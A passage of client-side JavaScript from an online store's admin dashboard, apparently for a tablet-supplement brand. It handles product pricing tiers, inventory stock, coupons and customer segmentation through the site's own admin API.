    discountAmount: prefill?.discountAmount ?? 0,
    rate: prefill?.rate ?? 0,
  }));
  renderTierRows();
}
function removeTierRow(rid) { drawerTiers = drawerTiers.filter(t => t.rid !== rid); renderTierRows(); }
function updateTierRow(rid, field, value) {
  const t = drawerTiers.find(x => x.rid === rid);
  if (!t) return;
  if (field === 'offerType') t.offerType = value;
  else if (field === 'discountType') t.discountType = value;
  else if (field === 'discount') t.discount = Math.min(99, Math.max(0, parseFloat(value) || 0));
  else if (field === 'discountAmount') t.discountAmount = Math.max(0, parseFloat(value) || 0);
  else if (field === 'qty') t.qty = Math.max(1, parseInt(value) || 1);
  else if (field === 'buyQuantity') t.buyQuantity = Math.max(1, parseInt(value) || 1);
  else if (field === 'freeQuantity') t.freeQuantity = Math.max(0, parseInt(value) || 0);
  tierBaseValues(t);
  renderTierRows();
}
function recalcAllTierRows() { drawerTiers.forEach(tierBaseValues); renderTierRows(); }
function renderTierRows() {
  const container = document.getElementById('tierRowsContainer');
  const empty = document.getElementById('tierRowsEmpty');
  if (!container) return;
  drawerTiers.forEach(tierBaseValues);
  drawerTiers.sort((a,b) => (a.qty||0) - (b.qty||0));
  if (!drawerTiers.length) { container.innerHTML = ''; if (empty) empty.style.display = 'block'; return; }
  if (empty) empty.style.display = 'none';
  container.innerHTML = drawerTiers.map(t => {
    const isBuyGet = t.offerType === 'buy_get';
    const tabs = t.tabs || t.qty * (parseInt(document.getElementById('dTabsPerPack')?.value) || 15);
    const pct = Math.round((t.discount || 0) * 100) / 100;
    return `<div class="tier-row"><div class="tier-row-grid">
      <div><div class="tier-row-label">Offer Type</div><select class="tier-row-input" onchange="updateTierRow(${t.rid},'offerType',this.value)"><option value="discount" ${!isBuyGet?'selected':''}>Discount</option><option value="buy_get" ${isBuyGet?'selected':''}>Buy X / Get Y</option></select></div>
      ${isBuyGet ? `<div><div class="tier-row-label">Buy Qty</div><input class="tier-row-input" type="number" min="1" value="${t.buyQuantity}" onchange="updateTierRow(${t.rid},'buyQuantity',this.value)"></div><div><div class="tier-row-label">Free Qty</div><input class="tier-row-input" type="number" min="0" value="${t.freeQuantity}" onchange="updateTierRow(${t.rid},'freeQuantity',this.value)"></div>` : `<div><div class="tier-row-label">Pack Qty</div><input class="tier-row-input" type="number" min="1" value="${t.qty}" onchange="updateTierRow(${t.rid},'qty',this.value)"></div><div><div class="tier-row-label">Discount Type</div><select class="tier-row-input" onchange="updateTierRow(${t.rid},'discountType',this.value)"><option value="percent" ${t.discountType!=='amount'?'selected':''}>Percentage</option><option value="amount" ${t.discountType==='amount'?'selected':''}>Fixed ₹</option></select></div><div><div class="tier-row-label">${t.discountType==='amount'?'Discount ₹':'Discount %'}</div><input class="tier-row-input" type="number" min="0" max="${t.discountType==='amount' ? t.mrp : 99}" value="${t.discountType==='amount' ? Math.round(t.discountAmount*100)/100 : pct}" onchange="updateTierRow(${t.rid},'${t.discountType==='amount'?'discountAmount':'discount'}',this.value)"></div>`}
      <div><div class="tier-row-label">Tier MRP (₹)</div><input class="tier-row-input" type="number" value="${t.mrp.toFixed(2)}" disabled style="opacity:0.6;"></div><div><div class="tier-row-label">Sale Rate (₹)</div><input class="tier-row-input" type="number" value="${t.rate.toFixed(2)}" disabled style="opacity:0.6;"></div>
    </div><div class="tier-row-foot"><div class="tier-row-preview">${tabs} tablets · ${isBuyGet ? `Buy ${t.buyQuantity} Get ${t.freeQuantity}` : `${pct.toFixed(2)}% effective saving`} → <b>₹${t.rate.toFixed(2)}</b> <span style="text-decoration:line-through;color:var(--text3);">₹${t.mrp.toFixed(2)}</span></div><button class="tier-row-remove" type="button" onclick="removeTierRow(${t.rid})">✕ Remove</button></div></div>`;
  }).join('');
}
async function saveProductFromDrawer() {
  const name = document.getElementById('dName').value.trim();
  if(!name) { toast('Product name is required','error'); return; }
  const price = parseFloat(document.getElementById('dPrice').value);
  if(!price) { toast('MRP is required','error'); return; }
  const body = {
    name,
    brand:            document.getElementById('dBrand').value||'Ozylix',
    badge:            document.getElementById('dBadge').value,
    category:         document.getElementById('dCategory').value,
    active:           document.getElementById('dActive').value !== 'false',
    description:      document.getElementById('dDescription').value,
    price,
    sale_price:       parseFloat(document.getElementById('dSalePrice').value)||null,
    discount_pct:     parseFloat(document.getElementById('dDiscountPct').value)||null,
    tablets_per_pack: parseInt(document.getElementById('dTabsPerPack').value)||15,
    dose_per_day:     parseFloat(document.getElementById('dDosePerDay').value)||1,
    pack_unit:        (document.getElementById('dPackUnit').value||'').trim()||null,
    tiers:            drawerTiers.map(t => {
                         tierBaseValues(t);
                         return {
                           tabs: t.tabs,
                           offerType: t.offerType === 'buy_get' ? 'buy_get' : 'discount',
                           buyQuantity: t.buyQuantity,
                           freeQuantity: t.freeQuantity,
                           discountType: t.offerType === 'buy_get' ? null : t.discountType,
                           discountValue: t.offerType === 'buy_get' ? 0 : (t.discountType === 'amount' ? t.discountAmount : t.discount),
                           discountPct: t.discount,
                           mrp: Math.round(t.mrp * 100) / 100,
                           rate: Math.round(t.rate * 100) / 100,
                         };
                       }),
    offer_text:       document.getElementById('dOfferText').value,
    hsn:              document.getElementById('dHsn').value||'30049099',
    stock:            parseInt(document.getElementById('dStock').value)||0,
    sort_order:       document.getElementById('dPosition').value === '' ? null : parseInt(document.getElementById('dPosition').value),
    how_to_use:       document.getElementById('dHowToUse').value,
    key_ingredients:  document.getElementById('dIngredients').value.split(',').map(s=>s.trim()).filter(Boolean),
    tags:             document.getElementById('dTags').value.split(',').map(s=>s.trim()).filter(Boolean),
    image:            document.getElementById('dImage').value,
    image2:           document.getElementById('dImage2').value,
    image3:           document.getElementById('dImage3').value,
    image4:           document.getElementById('dImage4').value,
    image5:           document.getElementById('dImage5').value,
    meta_description: document.getElementById('dMetaDesc').value,
    seo_keywords:     document.getElementById('dSeoKeywords').value.split(',').map(s=>s.trim()).filter(Boolean),
    seo_slug:            document.getElementById('dSeoSlug').value.trim(),
    seo_canonical_url:   document.getElementById('dSeoCanonical').value.trim(),
    seo_og_image:        document.getElementById('dSeoOgImage').value.trim(),
    seo_twitter_image:   document.getElementById('dSeoTwitterImage').value.trim(),
    seo_schema_type:     document.getElementById('dSeoSchemaType').value,
    seo_robots:          document.getElementById('dSeoRobots').value,
    seo_sitemap_include: document.getElementById('dSeoSitemap').checked,
  };
  try {
    const url  = drawerProductId ? `/api/admin/products/${drawerProductId}` : '/api/admin/products';
    const meth = drawerProductId ? 'PUT' : 'POST';
    const r    = await apiFetch(url, {method:meth, body:JSON.stringify(body)});
    const d    = await r.json();
    if(!r.ok) throw new Error(d.error||'Request failed');
    const savedProductId = drawerProductId || d.data?.id || d.product?.id || d.id;
    if (drawerHomeThumbnailPendingUrl && savedProductId) {
      const thumbResponse = await apiFetch(`/api/admin/products/${savedProductId}/home-thumbnail`, { method: 'PUT', body: JSON.stringify({ url: drawerHomeThumbnailPendingUrl }) });
      const thumbData = await thumbResponse.json().catch(() => ({}));
      if (!thumbResponse.ok) throw new Error(thumbData.error || 'Product saved, but homepage thumbnail was not saved');
      resetHomeThumbnailPreview(thumbData.data?.url || drawerHomeThumbnailPendingUrl);
    }
    toast(drawerProductId ? 'Product updated ✅' : 'Product created ✅');
    closeProductDrawer();
    loadProducts();
  } catch(e) { toast(e.message,'error'); }
}

async function deleteProduct(id) {
  if(!confirm('Soft-delete this product?')) return;
  const p = allProducts.find(x => x.id === id);
  if (!p) return;
  const prev = p.deleted_at;
  try {
    await confirmCriticalAction('Delete this product? It will be hidden from the store until restored.', async function(proof){
  await optimistic({
    // Gone from the list straight away — the row is what the admin is
    // looking at, so that is what has to change first.
    apply:    () => { p.deleted_at = new Date().toISOString(); filterProducts(); },
    commit:   () => expectOk(apiFetch(`/api/admin/products/${id}`, {method:'DELETE', headers: proof ? {'X-Password-Proof': proof} : {}}), 'Delete failed'),
    rollback: () => { p.deleted_at = prev; filterProducts(); },
    flash:    `#productsTbody tr[data-pid="${id}"]`,
    successMsg: 'Product deleted',
  });
    });
  } catch (e) { if (String(e.message) !== 'cancelled') toast(e.message, 'error'); }
}

async function restoreProduct(id) {
  const p = allProducts.find(x => x.id === id);
  if (!p) return;
  const prev = p.deleted_at;

  await optimistic({
    apply:    () => { p.deleted_at = null; filterProducts(); },
    commit:   () => expectOk(apiFetch(`/api/admin/products/${id}/restore`, {method:'PUT'}), 'Restore failed'),
    rollback: () => { p.deleted_at = prev; filterProducts(); },
    flash:    `#productsTbody tr[data-pid="${id}"]`,
    successMsg: 'Product restored ♻️',
  });
}

// ── Force a product sync (e.g. from an external catalog / source-of-truth) ──
async function syncProducts() {
  const btn = document.getElementById('btnSyncProducts');
  const body = document.getElementById('syncProductsBody');
  openModal('syncProductsModal');
  body.innerHTML = `<div class="empty-state loading-dots">Syncing</div>`;
  if (btn) { btn.disabled = true; btn.textContent = '🔄 Syncing…'; }
  try {
    const r = await apiFetch('/api/admin/products/sync', {method:'POST', signal:AbortSignal.timeout(60000)});
    const d = await r.json().catch(()=>({}));
    if (!r.ok) throw new Error(d.error || `Sync failed (HTTP ${r.status})`);

    // Be flexible about whatever shape the server returns
    const synced  = d.synced  ?? d.total   ?? d.count    ?? null;
    const created = d.created ?? d.added   ?? d.inserted ?? null;
    const updated = d.updated ?? d.changed ?? null;
    const skipped = d.skipped ?? d.unchanged ?? null;
    const failed  = d.failed  ?? d.errors_count ?? (Array.isArray(d.errors) ? d.errors.length : null);
    const errors  = Array.isArray(d.errors) ? d.errors : [];

    const stat = (label, val, ico) => val==null ? '' : `
      <div class="stat-tick"><span class="stat-tick-ico">${ico}</span><div><div class="stat-tick-val">${val}</div><div class="stat-tick-lbl">${label}</div></div></div>`;

    body.innerHTML = `
      <div style="font-size:0.85rem;color:var(--text2);margin-bottom:14px;">${esc(d.message || 'Sync completed.')}</div>
      <div class="stat-row" style="flex-wrap:wrap;margin-bottom:${errors.length?14:0}px;">
        ${stat('Synced', synced, '🔄')}
        ${stat('Created', created, '✨')}
        ${stat('Updated', updated, '✏️')}
        ${stat('Unchanged', skipped, '⏭️')}
        ${stat('Failed', failed, '⚠️')}
      </div>
      ${errors.length ? `
        <div style="font-size:0.75rem;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px;">Errors</div>
        <div style="max-height:180px;overflow-y:auto;background:var(--bg2);border-radius:8px;padding:10px 12px;">
          ${errors.map(e => `<div style="font-size:0.78rem;color:#E53535;padding:3px 0;">• ${esc(typeof e==='string'?e:(e.message||JSON.stringify(e)))}</div>`).join('')}
        </div>` : ''}
      ${(synced==null && created==null && updated==null) ? `
        <pre style="font-size:0.72rem;background:var(--bg2);border-radius:8px;padding:10px 12px;overflow-x:auto;white-space:pre-wrap;">${JSON.stringify(d,null,2)}</pre>` : ''}
    `;
    toast(`Products synced ✅${synced!=null?` (${synced})`:''}`);
    loadProducts();
  } catch(e) {
    body.innerHTML = `<div class="empty-state"><div class="empty-ico">⚠️</div><div class="empty-msg">${esc(e.message)}</div></div>`;
    toast('Sync failed: '+e.message, 'error'); // esc() happens inside toast()
  } finally {
    if (btn) { btn.disabled = false; btn.textContent = '🔄 Sync Products'; }
  }
}


// ═══════════════════════════════════════════════
// INVENTORY
// ═══════════════════════════════════════════════
function loadInventory() {
  filterInventory();
}

function setInvFilter(f, el) {
  currentInvFilter = f;
  document.querySelectorAll('#page-inventory .filter-chip').forEach(c => c.classList.remove('active'));
  el.classList.add('active');
  filterInventory();
}

function filterInventory() {
  const q = (document.getElementById('invSearch').value||'').toLowerCase();
  let list = allProducts.filter(p => !p.deleted_at);
  if(q) list = list.filter(p => p.name.toLowerCase().includes(q));
  if(currentInvFilter==='critical') list = list.filter(p => p.stock===0);
  if(currentInvFilter==='low') list = list.filter(p => p.stock>0 && p.stock<20);
  if(currentInvFilter==='ok') list = list.filter(p => p.stock>=20);
  list.sort((a,b) => a.stock-b.stock);

  document.getElementById('inventoryTbody').innerHTML = list.length ? list.map(p => {
    const status   = p.stock===0 ? 'badge-red' : p.stock<20 ? 'badge-gold' : 'badge-green';
    const stockCol = p.stock===0 ? 'var(--red)' : p.stock<20 ? 'var(--gold-text)' : 'var(--green-text)';
    const barColor = p.stock===0 ? 'var(--red)' : p.stock<20 ? 'var(--gold)' : 'var(--green)';
    const barWidth = Math.min(100, (p.stock / 200) * 100);
    const saleHtml = p.sale_price ? `<span style="font-size:0.7rem;color:var(--text3);text-decoration:line-through;margin-left:4px;">&#8377;${p.price}</span>` : '';
    const priceDisp = p.sale_price
      ? `<span style="color:var(--green-text);font-weight:700;">&#8377;${p.sale_price}</span>${saleHtml}`
      : `<span style="font-weight:600;">&#8377;${p.price}</span>`;
    return `
    <tr>
      <td style="width:60px;">
        <img src="${adminCdnImg(p.image)||'/assets/ozylix-icon-192.png'}"
          onerror="this.src='/assets/ozylix-icon-192.png'" alt="${p.name}"
          style="width:52px;height:52px;border-radius:10px;object-fit:contain;background:var(--bg2);padding:4px;border:1px solid var(--border);cursor:pointer;display:block;"
          onclick="openProductModal(${p.id})" title="Click to edit product">
      </td>
      <td>
        <div style="font-size:0.85rem;font-weight:600;color:var(--text);line-height:1.3;">${p.name}</div>
        <div style="font-size:0.72rem;color:var(--text3);margin-top:2px;">
          ID: ${p.id} &nbsp;·&nbsp;
          ${p.active===false ? '<span style="color:var(--red)">Inactive</span>' : '<span style="color:var(--green-text)">Active</span>'}
        </div>
      </td>
      <td><span class="badge badge-gray" style="text-transform:capitalize;">${p.category||'-'}</span></td>
      <td style="white-space:nowrap;">${priceDisp}</td>
      <td>
        <div style="display:flex;align-items:center;gap:10px;">
          <span style="font-family:var(--mono);font-size:1.05rem;font-weight:800;color:${stockCol};min-width:32px;">${p.stock}</span>
          <div style="width:90px;background:var(--border);border-radius:4px;height:7px;flex-shrink:0;">
            <div style="height:100%;width:${barWidth}%;background:${barColor};border-radius:4px;transition:width .3s;"></div>
          </div>
        </div>
      </td>
      <td><span class="badge ${status}">${p.stock===0?'Out of Stock':p.stock<20?'Low Stock':'In Stock'}</span></td>
      <td>
        <div style="display:flex;align-items:center;gap:5px;">
          <button class="btn btn-secondary btn-sm" onclick="adjustStock(${p.id},-1)" title="Remove 1" style="padding:4px 10px;font-size:1rem;line-height:1;">−</button>
          <input type="number" id="stockAdj_${p.id}" class="form-control"
            style="width:70px;text-align:center;padding:5px 4px;font-size:0.82rem;font-family:var(--mono);"
            placeholder="qty" min="0"
            onkeydown="if(event.key==='Enter') saveStockAdj(${p.id})">
          <button class="btn btn-primary btn-sm" onclick="saveStockAdj(${p.id})">Set</button>
          <button class="btn btn-secondary btn-sm" onclick="adjustStock(${p.id},1)" title="Add 1" style="padding:4px 10px;font-size:1rem;line-height:1;">+</button>
        </div>
      </td>
    </tr>`;
  }).join('') : '<tr><td colspan="7"><div class="empty-state"><div class="empty-ico">📦</div><div class="empty-msg">No products found</div></div></td></tr>';
}

async function adjustStock(id, delta) {
  const p = allProducts.find(x=>x.id===id); if(!p) return;
  const newStock = Math.max(0, p.stock + delta);
  try {
    await apiFetch(`/api/admin/products/${id}`, {method:'PUT', body:JSON.stringify({stock:newStock})});
    p.stock = newStock; filterInventory(); toast(`Stock updated: ${newStock}`);
  } catch(e) { toast(e.message,'error'); }
}

async function saveStockAdj(id) {
  const inp = document.getElementById(`stockAdj_${id}`); if(!inp) return;
  const qty = parseInt(inp.value); if(isNaN(qty)) { toast('Enter valid quantity','error'); return; }
  const p = allProducts.find(x=>x.id===id); if(!p) return;
  try {
    await apiFetch(`/api/admin/products/${id}`, {method:'PUT', body:JSON.stringify({stock:qty})});
    p.stock = qty; inp.value=''; filterInventory(); toast(`Stock set to ${qty} ✅`);
  } catch(e) { toast(e.message,'error'); }
}

// ═══════════════════════════════════════════════
// DISCOUNTS
// ═══════════════════════════════════════════════

// Legacy alias — openProductModal now opens the drawer
function openProductModal(productId) { openProductDrawer(productId); }
async function loadDiscounts() {
  try {
    const r = await apiFetch('/api/admin/coupons');
    const result = await r.json().catch(() => ({}));
    if (!r.ok) throw new Error(result.error || `Coupon list failed (${r.status})`);
    allDiscounts = result.data || [];
    renderDiscounts();
  } catch(e) { toast('Discounts error: '+e.message,'error'); }
}

function renderDiscounts() {
  document.getElementById('discountsTbody').innerHTML = allDiscounts.length ? allDiscounts.map(c => {
    const isDeleted = !!c.deleted_at;
    const lifecycleAction = isDeleted
      ? `<button class="btn btn-secondary btn-sm btn-icon" title="Restore and activate" onclick="restoreCoupon(${Number(c.id)})">↻</button>`
      : `<button class="btn btn-danger btn-sm btn-icon" title="Deactivate and delete" onclick="deleteCoupon(${Number(c.id)})">🗑️</button>`;
    return `
    <tr style="${isDeleted?'opacity:0.55;':''}">
      <td><span style="font-family:var(--mono);font-weight:700;color:var(--gold-text);">${esc(c.code)}</span></td>
      <td><span class="badge badge-gray">${esc(c.type)}</span></td>
      <td style="font-weight:600;">${c.type==='percent'?esc(c.value)+'%':'₹'+esc(c.value)}</td>
      <td>₹${esc(c.min_order||0)}</td>
      <td><span style="font-family:var(--mono);">${esc(c.used_count||0)}/${esc(c.max_uses||'∞')}${c.max_uses_per_customer?` · ${esc(c.max_uses_per_customer)}/customer`:''}${c.max_discount!=null?` · cap ₹${esc(c.max_discount)}`:''}</span></td>
      <td style="font-size:0.75rem;color:var(--text3);">${c.expires_at?fmtDate(c.expires_at):'No expiry'}</td>
      <td>${isDeleted?`<span class="badge badge-red">Deleted / Deactivated</span>`:c.active?`<span class="badge badge-green">Active</span>`:`<span class="badge badge-gray">Inactive</span>`}</td>
      <td>
        <div style="display:flex;gap:4px;">
          <button class="btn btn-secondary btn-sm btn-icon" title="Edit coupon" onclick="openCouponModal(${Number(c.id)})">✏️</button>
          ${lifecycleAction}
        </div>
      </td>
    </tr>`;
  }).join('') : '<tr><td colspan="8"><div class="empty-state">No coupons found</div></td></tr>';
}

function updateCouponTypeHints() {
  const isPercent = document.getElementById('cType').value === 'percent';
  const label = document.getElementById('cMaxDiscountLabel');
  const input = document.getElementById('cMaxDiscount');
  const hint = document.getElementById('cMaxDiscountHint');
  if (label) label.textContent = 'Maximum Discount (₹)';
  if (input) {
    input.required = false;
    input.min = '0';
    input.placeholder = isPercent ? 'Optional absolute cap (recommended)' : 'Optional absolute cap';
  }
  if (hint) hint.textContent = isPercent
    ? 'Optional: a hard rupee cap on this percent coupon. Strongly recommended for % coupons.'
    : 'Optional: a flat coupon can also have an absolute rupee cap.';
}

function openCouponModal(id) {
  editingCouponId = id;
  document.getElementById('couponModalTitle').textContent = id ? 'Edit Coupon' : 'New Coupon';
  if(id) {
    const c = allDiscounts.find(x=>x.id===id); if(!c) return;
    document.getElementById('cCode').value = c.code||'';
    document.getElementById('cType').value = c.type||'percent';
    document.getElementById('cValue').value = c.value||'';
    document.getElementById('cMinOrder').value = c.min_order||0;
    document.getElementById('cMaxUses').value = c.max_uses||'';
    document.getElementById('cMaxDiscount').value = c.max_discount ?? '';
    document.getElementById('cMaxUsesPerCustomer').value = c.max_uses_per_customer ?? '';
    document.getElementById('cExpires').value = c.expires_at?c.expires_at.split('T')[0]:'';
    document.getElementById('cActive').checked = c.active !== false;
  } else {
    ['cCode','cValue','cMaxUses','cMaxDiscount','cMaxUsesPerCustomer','cExpires'].forEach(fieldId => document.getElementById(fieldId).value='');
    document.getElementById('cMinOrder').value = '0';
    document.getElementById('cActive').checked = true;
    document.getElementById('cType').value = 'percent';
  }
  updateCouponTypeHints();
  openModal('couponModal');
}

async function saveCoupon() {
  const code = document.getElementById('cCode').value.trim().toUpperCase();
  const type = document.getElementById('cType').value;
  const value = Number(document.getElementById('cValue').value);
  const maxDiscountRaw = document.getElementById('cMaxDiscount').value.trim();
  const maxDiscount = maxDiscountRaw === '' ? null : Number(maxDiscountRaw);
  const minOrderRaw = document.getElementById('cMinOrder').value.trim();
  const maxUsesRaw = document.getElementById('cMaxUses').value.trim();
  const perCustomerRaw = document.getElementById('cMaxUsesPerCustomer').value.trim();

  if(!/^[A-Z0-9][A-Z0-9_-]{2,39}$/.test(code)) {
    toast('Use a 3–40 character code with letters, numbers, hyphens, or underscores','error'); return;
  }
  if(!Number.isFinite(value) || value <= 0) { toast('Coupon value must be greater than 0','error'); return; }
  if(type === 'percent' && (value <= 0 || value > 100)) { toast('Percent value must be between 1 and 100','error'); return; }
  if(type === 'flat' && maxDiscount !== null && (!Number.isFinite(maxDiscount) || maxDiscount < 0)) {
    toast('Enter a valid maximum discount','error'); return;
  }

  const body = {
    code, type, value,
    min_order: minOrderRaw === '' ? null : Number(minOrderRaw),
    max_uses: maxUsesRaw === '' ? null : Number(maxUsesRaw),
    max_discount: maxDiscount,
    max_uses_per_customer: perCustomerRaw === '' ? null : Number(perCustomerRaw),
    expires_at:document.getElementById('cExpires').value||null,
    active:document.getElementById('cActive').checked,
  };
  try {
    const url  = editingCouponId ? `/api/admin/coupons/${editingCouponId}` : '/api/admin/coupons';
    const meth = editingCouponId ? 'PUT' : 'POST';
    const r = await apiFetch(url, {method:meth, body:JSON.stringify(body)});
    const result = await r.json().catch(() => ({}));
    if(!r.ok) throw new Error(result.error || `Coupon save failed (${r.status})`);
    toast(editingCouponId ? 'Coupon updated and saved ✅' : 'Coupon created and saved to Supabase ✅');
    closeModal('couponModal');
    await loadDiscounts();
  } catch(e) { toast(e.message,'error'); }
}

async function deleteCoupon(id) {
  if(!confirm('Deactivate and delete this coupon? It will remain in Supabase as a deleted record and can be restored.')) return;
  try {
    await confirmCriticalAction('Delete this coupon? Customers who already have it will see it expire.', async function(proof){
      const r = await apiFetch(`/api/admin/coupons/${id}`,{method:'DELETE', headers: proof ? {'X-Password-Proof': proof} : {}});
      const result = await r.json().catch(() => ({}));
      if(!r.ok) throw new Error(result.error || `Coupon delete failed (${r.status})`);
      toast('Coupon deactivated and marked deleted in Supabase');
      await loadDiscounts();
    });
  } catch(e) { if (String(e.message) !== 'cancelled') toast(e.message,'error'); }
}

async function restoreCoupon(id) {
  if(!confirm('Restore and activate this coupon?')) return;
  try {
    const r = await apiFetch(`/api/admin/coupons/${id}/restore`,{method:'POST'});
    const result = await r.json().catch(() => ({}));
    if(!r.ok) throw new Error(result.error || `Coupon restore failed (${r.status})`);
    toast('Coupon restored and activated ✅');
    await loadDiscounts();
  } catch(e) { toast(e.message,'error'); }
}

// ── Customer soft-delete / restore (customers.delete, password-gated) ──
async function deleteCustomer(id) {
  if(!confirm('Soft-delete this customer? Their order history is preserved and the record can be restored.')) return;
  try {
    await confirmCriticalAction('Delete this customer from the list? (Soft-delete — order history is preserved)', async function(proof){
      const r = await apiFetch(`/api/admin/customers/${id}`, {method:'DELETE', headers: proof ? {'X-Password-Proof': proof} : {}});
      const d = await r.json().catch(() => ({}));
      if(!r.ok) throw new Error(d.error || `Delete failed (${r.status})`);
      const idx = allCustomers.findIndex(x => x.id === id);
      if (idx > -1) allCustomers.splice(idx, 1);
      toast('Customer soft-deleted ✅');
      filterCustomers();
    });
  } catch(e) { if (String(e.message) !== 'cancelled') toast(e.message,'error'); }
}

async function restoreCustomer(id) {
  if(!confirm('Restore this soft-deleted customer?')) return;
  try {
    const r = await apiFetch(`/api/admin/customers/${id}/restore`, {method:'PUT'});
    const d = await r.json().catch(() => ({}));
    if(!r.ok) throw new Error(d.error || `Restore failed (${r.status})`);
    toast('Customer restored ✅');
    loadCustomers();
  } catch(e) { toast(e.message,'error'); }
}

// ═══════════════════════════════════════════════
// CUSTOMERS
// ═══════════════════════════════════════════════
const CUSTOMERS_PER_PAGE = 50;
let customersPage = 1;
let customersDateMode = 'all';
let customersFilteredList = [];

async function loadCustomers() {
  try {
    // Aug 2026: fetch the full (non-deleted) list in one request so
    // client-side paging, filters and KPIs cover every customer. The server
    // caps a single page at 200 rows; with dozens of customers one call
    // returns them all (the orders table already does the same with ?limit=2000).
    const r = await apiFetch('/api/admin/customers?limit=200');
    allCustomers = (await r.json()).data || [];
    // Aug 2026: enrich with re-targeting segments. Fetching insights for ALL
    // customers would be one request each, so instead enrich page-by-page in
    // the background (a few requests per view) and always on the first page.
    enrichCustomerSegments(1);
    populateCustomerYearFilter();
    filterCustomers();
  } catch(e) { toast('Customers error: '+e.message,'error'); }
}

// ── Client-side segment fallback until the server pass arrives ──────────
// Mirrors the backend classify() so the Segment column is never blank.
function clientSeg(c) {
  const days = c.last_order_at ? Math.floor((Date.now() - new Date(c.last_order_at).getTime())/86400000) : (c.created_at ? Math.floor((Date.now() - new Date(c.created_at).getTime())/86400000) : null);
  const o = c.total_orders || 0, ltv = parseFloat(c.total_spent || 0);
  if (o === 0) return 'new';
  if (days !== null && days >= 180) return 'churned';
  if (days !== null && days >= 90) return 'dormant';
  if (o >= 5 && ltv >= 10000) return 'vip';
  if (o >= 5) return 'loyal';
  if (o >= 2) return 'repeat';
  return 'new';
}

// Background enrichment: pulls /api/admin/customers/:id/insights for the
// current page (and caches), then re-renders. Failure is silent — the
// client-side fallback keeps the column honest either way.
async function enrichCustomerSegments(page) {
  const perPage = 50;
  const start = (page - 1) * perPage;
  const ids = allCustomers.slice(start, start + perPage).map(c => c.id);
  if (!ids.length) return;
  for (const id of ids) {
    if (allCustomers.find(c => c.id === id && c.segment)) continue;
    try {
      const r = await apiFetch('/api/admin/customers/' + id + '/insights');
      const ins = (await r.json()).data || {};
      const c = allCustomers.find(x => x.id === id);
      if (c) {
        c.segment = ins.segment || clientSeg(c);
        c.last_order_at = ins.last_order_at || null;
        c.total_orders = ins.total_orders != null ? ins.total_orders : c.total_orders;
        c.total_spent = ins.total_spent != null ? ins.total_spent : c.total_spent;
        c._insight = ins; // keep full insight for the drawer
      }
    } catch(e) { /* keep fallback segment */ }
  }
  filterCustomers();
}

function populateCustomerYearFilter() {
  const sel = document.getElementById('custYearFilter');
  if (!sel || sel.options.length > 1) return;
  const years = new Set(allCustomers.map(c => (c.created_at||'').slice(0,4)).filter(Boolean));
  years.add(String(new Date().getFullYear()));
  sel.innerHTML = '<option value="">Any Year</option>' +
    [...years].sort().reverse().map(y => `<option value="${y}">${y}</option>`).join('');
}

function setCustomerDateRange(days, btn) {
  customersDateMode = days;
  document.querySelectorAll('[id^=custDateChip]').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
  document.getElementById('custMonthFilter').value = '';
  document.getElementById('custYearFilter').value = '';
  document.getElementById('custDateStart').value = '';
  document.getElementById('custDateEnd').value = '';
  customersPage = 1;
  filterCustomers();
}

function setCustomerMonthYear() {
  customersDateMode = 'month';
  document.querySelectorAll('[id^=custDateChip]').forEach(b=>b.classList.remove('active'));
  document.getElementById('custDateStart').value = '';
  document.getElementById('custDateEnd').value = '';
  customersPage = 1;
  filterCustomers();
}

function setCustomerCustomRange() {
  customersDateMode = 'custom';
  document.querySelectorAll('[id^=custDateChip]').forEach(b=>b.classList.remove('active'));
  document.getElementById('custMonthFilter').value = '';
  document.getElementById('custYearFilter').value = '';
  customersPage = 1;
  filterCustomers();
}

function clearCustomerDateFilters() {
  customersDateMode = 'all';
  document.querySelectorAll('[id^=custDateChip]').forEach(b=>b.classList.remove('active'));
  document.getElementById('custDateChipAll').classList.add('active');
  document.getElementById('custMonthFilter').value = '';
  document.getElementById('custYearFilter').value = '';
  document.getElementById('custDateStart').value = '';
  document.getElementById('custDateEnd').value = '';
  customersPage = 1;
  filterCustomers();
}

function filterCustomers() {
  const q = (document.getElementById('custSearch').value||'').toLowerCase();
    let list = allCustomers;
  if (q) list = list.filter(c => (c.name+c.email+c.phone).toLowerCase().includes(q));
  if (customersDateMode === 'today') {
    const todayStr = new Date().toISOString().split('T')[0];
    list = list.filter(c => (c.created_at||'').startsWith(todayStr));
  } else if (customersDateMode === 7 || customersDateMode === 30 || customersDateMode === 90) {
    const cutoff = Date.now() - customersDateMode * 86400000;
    list = list.filter(c => new Date(c.created_at).getTime() >= cutoff);
  } else if (customersDateMode === 'month') {
    const m = document.getElementById('custMonthFilter').value;
    const y = document.getElementById('custYearFilter').value;
    if (m) list = list.filter(c => (c.created_at||'').slice(5,7) === m.padStart(2,'0'));
    if (y) list = list.filter(c => (c.created_at||'').slice(0,4) === y);
  } else if (customersDateMode === 'custom') {
    const start = document.getElementById('custDateStart').value;
    const end   = document.getElementById('custDateEnd').value;
    if (start) list = list.filter(c => c.created_at >= start);
    if (end)   list = list.filter(c => c.created_at <= end + 'T23:59:59');
  }

  customersFilteredList = list;
  const totalPages = Math.max(1, Math.ceil(list.length / CUSTOMERS_PER_PAGE));
  if (customersPage > totalPages) customersPage = 1;

  // KPIs
  const repeat = list.filter(c => (c.total_orders||0) > 1).length;
  const totalSpent = list.reduce((s,c)=>s+parseFloat(c.total_spent||0),0);
  document.getElementById('custKpiTotal').textContent = list.length;
  document.getElementById('custKpiNew').textContent = list.length;
  document.getElementById('custKpiRepeat').textContent = repeat;
  document.getElementById('custKpiAvg').textContent = list.length ? '₹'+fmtNum(Math.round(totalSpent/list.length)) : '₹0';

  // Charts
  renderCustomerGrowthChart(list);
  renderCustomerRepeatChart(list, repeat);

  renderCustomersPage();
}

function renderCustomerGrowthChart(list) {
  const days = customersDateMode===90?90 : customersDateMode===30?30 : customersDateMode===7?7 : 30;
  const buckets = Array.from({length:days}, (_,i) => {
    const d = new Date(); d.setDate(d.getDate() - (days-1-i));
    return { label: d.getDate()+'/'+(d.getMonth()+1), date: d.toISOString().split('T')[0], count: 0 };
  });
  list.forEach(c => {
    const day = (c.created_at||'').split('T')[0];
    const b = buckets.find(b=>b.date===day);
    if (b) b.count++;
  });
  drawAreaChart('custGrowthCanvas', buckets.map(b=>b.label), buckets.map(b=>b.count), '#547177');
}

function renderCustomerRepeatChart(list, repeat) {
  const canvas = document.getElementById('custRepeatCanvas');
  if (!canvas || typeof drawDonutChart !== 'function') return;
  const newCust = Math.max(0, list.length - repeat);
